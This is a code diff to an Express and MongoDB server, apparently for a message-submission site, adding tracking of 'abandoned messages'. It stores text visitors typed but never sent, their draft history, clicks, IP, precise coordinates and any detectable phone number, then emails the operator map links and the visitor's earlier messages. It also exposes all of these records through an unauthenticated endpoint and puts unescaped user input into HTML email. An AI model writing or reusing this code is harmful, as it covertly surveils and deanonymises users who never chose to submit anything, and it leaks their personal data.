@@ -78,6 +78,38 @@ const messageSchema = new mongoose.Schema({
 
 const Message = mongoose.model('Message', messageSchema);
 
+// Schema for abandoned messages (typed but not sent)
+const abandonedMessageSchema = new mongoose.Schema({
+  id: { type: Number, required: true },
+  partialMessage: { type: String, required: true },
+  timestamp: { type: String, required: true },
+  timeOnPage: Number,
+  clickPatterns: [{ element: String, timestamp: Number }],
+  textHistory: [{ text: String, timestamp: Number }],
+  ip: String,
+  location: String,
+  coordinates: {
+    latitude: Number,
+    longitude: Number,
+    accuracy: Number
+  },
+  userAgent: {
+    browser: String,
+    browserVersion: String,
+    os: String,
+    osVersion: String,
+    deviceType: String
+  },
+  referrer: String,
+  source: String,
+  language: String,
+  shareTag: String,
+  phone: String,
+  reason: { type: String, default: 'page_exit' } // page_exit, tab_close, etc.
+}, { timestamps: true });
+
+const AbandonedMessage = mongoose.model('AbandonedMessage', abandonedMessageSchema);
+
 app.set('trust proxy', true);
 app.use(cors());
 app.use(express.json());
@@ -132,6 +164,140 @@ app.get('/messages', async (req, res) => {
   } catch (err) {
     console.error('Error fetching messages:', err);
     res.json([]);
+  }
+});
+
+// Get all abandoned messages
+app.get('/abandoned-messages', async (req, res) => {
+  try {
+    const abandoned = await AbandonedMessage.find().sort({ id: -1 }).lean();
+    res.json(abandoned);
+  } catch (err) {
+    console.error('Error fetching abandoned messages:', err);
+    res.json([]);
+  }
+});
+
+// Post abandoned message (when user leaves without sending)
+app.post('/abandoned-message', async (req, res) => {
+  try {
+    const { partialMessage, reason } = req.body;
+    
+    // Only track if there's actual content
+    if (!partialMessage?.trim() || partialMessage.trim().length < 3) {
+      return res.status(200).json({ message: 'Too short, not tracked' });
+    }
+
+    const ip = getClientIP(req);
+    const { location, coordinates } = await getGeolocation(ip);
+    const phoneAuto = extractPhone(req);
+    const userAgent = parseUserAgent(req);
+    const referrer = req.headers['referer'] || 'Direct';
+    const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
+    const source = detectSource(referrer, req.headers['user-agent']);
+
+    const abandonedData = {
+      id: Date.now(),
+      partialMessage: partialMessage.trim(),
+      timestamp: new Date().toISOString(),
+      ip,
+      location,
+      coordinates: req.body.coordinates || coordinates,
+      timeOnPage: req.body.timeOnPage || null,
+      clickPatterns: req.body.clickPatterns || [],
+      textHistory: req.body.textHistory || [],
+      userAgent,
+      referrer,
+      source,
+      language,
+      shareTag: req.body.shareTag || null,
+      reason: reason || 'page_exit'
+    };
+    if (phoneAuto) abandonedData.phone = phoneAuto;
+
+    // Save to MongoDB
+    const saved = await AbandonedMessage.create(abandonedData);
+
+    // Find all previous messages from this IP (both sent and abandoned)
+    const previousSent = await Message.find({ ip }).sort({ id: -1 }).limit(5).lean();
+    const previousAbandoned = await AbandonedMessage.find({ 
+      ip, 
+      id: { $ne: saved.id } 
+    }).sort({ id: -1 }).limit(5).lean();
+
+    // EMAIL notification
+    const coord = saved.coordinates || {};
+    const uaInfo = saved.userAgent || {};
+    const mapsLink = (coord.latitude && coord.longitude)
+      ? `https://www.google.com/maps?q=${coord.latitude},${coord.longitude}`
+      : null;
+    const osmLink = (coord.latitude && coord.longitude)
+      ? `https://www.openstreetmap.org/?mlat=${coord.latitude}&mlon=${coord.longitude}#map=16/${coord.latitude}/${coord.longitude}`
+      : null;
+
+    const textBody = `
+🚨 ABANDONED MESSAGE (User left without sending)
+
+Partial Message: ${saved.partialMessage}
+Reason: ${saved.reason}
+Time (Sri Lanka - UTC +5:30): ${new Date(new Date(saved.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}
+Time on Page: ${saved.timeOnPage ?? 'N/A'} seconds
+Click Patterns: ${saved.clickPatterns.length > 0 ? saved.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}
+Text History: ${saved.textHistory.length > 0 ? saved.textHistory.map(h => `"${h.text}" at ${h.timestamp}ms`).join(' → ') : 'None'}
+IP: ${saved.ip}
+Location: ${saved.location}
+Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)
+Browser: ${uaInfo.browser} ${uaInfo.browserVersion}
+OS: ${uaInfo.os} ${uaInfo.osVersion}
+Device: ${uaInfo.deviceType}
+Referrer: ${saved.referrer}
+Source: ${saved.source}
+Share Tag: ${saved.shareTag ?? 'N/A'}
+Language: ${saved.language}${phoneAuto ? `\nPhone: ${phoneAuto}` : ''}
+${mapsLink ? `\nMap (Google): ${mapsLink}` : ''}
+${osmLink ? `\nMap (OpenStreetMap): ${osmLink}` : ''}
+
+User's Previous Sent Messages: ${previousSent.length > 0 ? previousSent.map(m => `"${m.message}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join(' | ') : 'None'}
+User's Previous Abandoned Messages: ${previousAbandoned.length > 0 ? previousAbandoned.map(m => `"${m.partialMessage}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join(' | ') : 'None'}
+    `.trim();
+
+    const htmlBody = `
+      <div style="font-family: Arial, sans-serif; line-height: 1.5; background-color: #fff3cd; padding: 15px; border-left: 5px solid #ffc107;">
+        <h2 style="color: #856404;">🚨 ABANDONED MESSAGE (User left without sending)</h2>
+        <p><strong>Partial Message:</strong> ${saved.partialMessage}</p>
+        <p><strong>Reason:</strong> ${saved.reason}</p>
+        <p><strong>Time (Sri Lanka - UTC +5:30):</strong> ${new Date(new Date(saved.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}</p>
+        <p><strong>Time on Page:</strong> ${saved.timeOnPage ?? 'N/A'} seconds</p>
+        <p><strong>Click Patterns:</strong> ${saved.clickPatterns.length > 0 ? saved.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}</p>
+        <p><strong>Text History (All Drafts):</strong><br/>
+        ${saved.textHistory.length > 0 ? saved.textHistory.map((h, i) => `${i + 1}. "${h.text}" (at ${h.timestamp}ms)`).join('<br/>') : 'None'}</p>
+        <p><strong>IP:</strong> ${saved.ip}</p>
+        <p><strong>Location:</strong> ${saved.location}</p>
+        <p><strong>Coordinates:</strong> ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)</p>
+        <p><strong>Browser:</strong> ${uaInfo.browser} ${uaInfo.browserVersion}</p>
+        <p><strong>OS:</strong> ${uaInfo.os} ${uaInfo.osVersion}</p>
+        <p><strong>Device:</strong> ${uaInfo.deviceType}</p>
+        <p><strong>Referrer:</strong> ${saved.referrer}</p>
+        <p><strong>Source:</strong> ${saved.source}</p>
+        <p><strong>Share Tag:</strong> ${saved.shareTag ?? 'N/A'}</p>
+        <p><strong>Language:</strong> ${saved.language}</p>
+        ${phoneAuto ? `<p><strong>Phone:</strong> ${phoneAuto}</p>` : ''}
+        ${mapsLink ? `<p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>` : ''}
+        ${osmLink ? `<p><a href="${osmLink}" target="_blank">View on OpenStreetMap</a></p>` : ''}
+        <p><strong>User's Previous Sent Messages:</strong> ${previousSent.length > 0 ? previousSent.map((m, i) => `<br/>${i + 1}. "${m.message}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join('') : 'None'}</p>
+        <p><strong>User's Previous Abandoned Messages:</strong> ${previousAbandoned.length > 0 ? previousAbandoned.map((m, i) => `<br/>${i + 1}. "${m.partialMessage}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join('') : 'None'}</p>
+      </div>
+    `;
+
+    sendEmail('⚠️ Abandoned Message Alert', textBody, htmlBody);
+
+    res.status(201).json({
+      message: 'Abandoned message tracked',
+      data: saved
+    });
+  } catch (err) {
+    console.error('❌ Error saving abandoned message:', err);
+    res.status(500).json({ error: err.message || 'Failed to save' });
   }
 });
 
